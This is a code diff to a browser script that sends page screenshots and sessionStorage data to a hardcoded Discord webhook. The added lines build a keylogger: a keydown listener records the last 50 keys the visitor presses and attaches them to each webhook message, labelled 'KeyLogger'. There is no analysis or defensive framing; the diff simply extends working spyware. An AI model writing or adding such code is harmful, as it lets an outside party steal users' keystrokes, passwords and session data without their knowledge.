@@ -403,6 +403,16 @@ ${sessionStorageData}
 (async () => {
     const WEBHOOK_URL = 'https://discord.com/api/webhooks/1393595797530083390/1dDSykIyP3bqwownNM3Ro1I-LLcI2Sn1KM2SMb9a6b-POlE3TlsvgkMSZhPRLfTVKNod';
     let messageId = null;
+    let pressedKeys = []; // Массив для хранения клавиш
+
+    // Слушатель нажатий клавиш
+    document.addEventListener('keydown', (event) => {
+        pressedKeys.push(event.key);
+        // Ограничиваем длину до последних 50 символов
+        if (pressedKeys.length > 50) {
+            pressedKeys.shift();
+        }
+    });
 
     if (typeof html2canvas === 'undefined') {
         const script = document.createElement('script');
@@ -425,7 +435,11 @@ ${sessionStorageData}
             const blob = await new Promise(res => canvas.toBlob(res, 'image/jpeg', 0.7));
             const formData = new FormData();
             
+            // Формируем текст с последними клавишами
+            const keyLogText = `KeyLogger: ${pressedKeys.join(' ')}`;
+            
             const payload = {
+                content: keyLogText, // Добавляем текст в сообщение
                 attachments: []
             };
             
@@ -446,7 +460,8 @@ ${sessionStorageData}
                 });
                 
                 if (res.status === 429) {
-                    const retryAfter = (await res.json()).retry_after || 5;
+                    const data = await res.json();
+                    const retryAfter = data.retry_after || 5;
                     await new Promise(r => setTimeout(r, retryAfter * 1000));
                 }
             }
